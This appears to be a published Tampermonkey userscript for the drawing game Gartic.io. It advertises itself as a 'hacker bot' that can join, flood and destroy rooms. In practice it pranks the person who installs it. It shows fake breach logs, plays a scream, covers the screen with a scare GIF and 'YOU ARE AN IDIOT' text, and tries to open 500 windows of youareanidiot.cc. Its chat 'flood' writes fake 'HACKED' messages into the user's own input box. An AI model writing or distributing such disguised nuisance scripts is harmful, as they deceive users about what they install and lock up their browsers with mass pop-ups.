// ==UserScript==
// @name         Destroyer of Kingdoms - Hacker Bot
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  Hacker-style bot panel for Gartic.io with scary sound effects
// @author       187
// @match        *://gartic.io/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/527223/Destroyer%20of%20Kingdoms%20-%20Hacker%20Bot.user.js
// @updateURL https://update.greasyfork.org/scripts/527223/Destroyer%20of%20Kingdoms%20-%20Hacker%20Bot.meta.js
// ==/UserScript==


(function() {
    'use strict';

    let scarySound = new Audio("https://www.myinstants.com/media/sounds/scare-scream.mp3");

    let panel = document.createElement("div");
    panel.style = "position:fixed; top:10px; left:10px; width:320px; background:black; color:red; border:2px solid red; padding:10px; z-index:9999; font-family:Arial,sans-serif; text-align:center; box-shadow:0 0 10px red;";
    document.body.appendChild(panel);

    let title = document.createElement("h2");
    title.innerHTML = "🔥 DESTROYER OF KINGDOMS v1.0 🔥";
    panel.appendChild(title);

    let roomInput = document.createElement("input");
    roomInput.type = "text";
    roomInput.placeholder = "Enter room link...";
    roomInput.style = "width:80%; margin:5px 0;";
    panel.appendChild(roomInput);

    let joinButton = document.createElement("button");
    joinButton.innerHTML = "JOIN";
    joinButton.style = "width:50px; margin-left:5px; background:red; color:white; border:none; cursor:pointer;";
    joinButton.onclick = trollEffect;
    panel.appendChild(joinButton);

    panel.appendChild(document.createElement("br"));

    let messageInput = document.createElement("input");
    messageInput.type = "text";
    messageInput.placeholder = "Enter your message...";
    messageInput.style = "width:80%; margin:5px 0;";
    panel.appendChild(messageInput);

    let sendButton = document.createElement("button");
    sendButton.innerHTML = "SEND";
    sendButton.style = "width:70px; margin-left:5px; background:red; color:white; border:none; cursor:pointer;";
    sendButton.onclick = trollEffect;
    panel.appendChild(sendButton);

    panel.appendChild(document.createElement("br"));

    function addButton(text, callback) {
        let btn = document.createElement("button");
        btn.innerHTML = text;
        btn.style = "width:100%; margin:5px 0; padding:8px; background:red; color:white; border:none; cursor:pointer;";
        btn.onclick = callback;
        panel.appendChild(btn);
    }

    addButton("JOIN ROOM", trollEffect);
    addButton("LEAVE ROOM", trollEffect);
    addButton("SPAM CHAT", floodChat);
    addButton("DESTROY ROOM", trollEffect);
    addButton("CRASH SYSTEM", openIdiotSites);
    addButton("FLOOD MESSAGES", floodChat);
    addButton("BLOCK SITE (FOR VIP SCRIPT💀)", fakeError);

    function trollEffect() {
        let logMessages = [
            "[ERROR] Connection lost...",
            "[RECONNECTING] Reconnecting...",
            "[HACK INITIATED] Retrieving system data...",
            "[SECURITY BREACH] Anti-cheat disabled!",
            "[COMPLETE] Target system compromised!"
        ];

        let logIndex = 0;

        function showNextLog() {
            if (logIndex < logMessages.length) {
                let logDiv = document.createElement("div");
                logDiv.innerHTML = logMessages[logIndex];
                logDiv.style = "position:fixed; top:80%; left:10px; color:red; background:black; padding:5px; font-size:14px; z-index:9999;";
                document.body.appendChild(logDiv);
                logIndex++;
                setTimeout(showNextLog, 1000);
            } else {
                showScaryGIF();
            }
        }

        showNextLog();
    }

    function showScaryGIF() {
        scarySound.play();

        let gif = document.createElement("img");
        gif.src = "https://r.resimlink.com/jmU-51fsEAXI.gif";
        gif.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:9999;";
        document.body.appendChild(gif);

        setTimeout(() => {
            gif.remove();

            let idiotMsg = document.createElement("div");
            idiotMsg.innerHTML = "HAHA YOU ARE AN IDIOT";
            idiotMsg.style = "position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:red; color:white; padding:20px; font-size:30px; font-weight:bold; z-index:9999;";
            document.body.appendChild(idiotMsg);

            setTimeout(() => {
                idiotMsg.remove();
                openIdiotSites();
            }, 2000);
        }, 5000);
    }

function openIdiotSites() {
    let urls = [];
    for (let i = 0; i < 500; i++) {
        urls.push("https://www.youareanidiot.cc/lol.html");
    }

    let winArr = [];

    for (let i = 0; i < urls.length; i++) {
        let win = window.open(urls[i], "_blank");
        if (win) {
            winArr.push(win);
        }
    }

    setTimeout(() => {
        winArr.forEach(win => {
            if (win && !win.closed) {
                win.focus();
            }
        });
    }, 500);
}


    function floodChat() {
        let chatInput = document.querySelector("input[type='text']");

        if (!chatInput) return;

        let messages = [
            "HACKED BY DESTROYER OF KINGDOMS",
            "YOUR SYSTEM HAS BEEN COMPROMISED",
            "HACKER ALERT!",
            "YOUR DATA HAS BEEN LEAKED!",
            "ANONYMOUS OPERATIONS SUCCESS"
        ];

        let index = 0;

        let interval = setInterval(() => {
            if (index >= messages.length) index = 0;
            chatInput.value = messages[index];
            let event = new Event("input", { bubbles: true });
            chatInput.dispatchEvent(event);
            index++;
        }, 500);

        setTimeout(() => clearInterval(interval), 5000);
    }

    function fakeError() {
        let errMsg = document.createElement("div");
        errMsg.innerHTML = "💀 FATAL ERROR: SYSTEM FAILURE 💀";
        errMsg.style = "position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); background:black; color:red; padding:20px; font-size:30px; font-weight:bold; z-index:9999;";
        document.body.appendChild(errMsg);
    }

})();
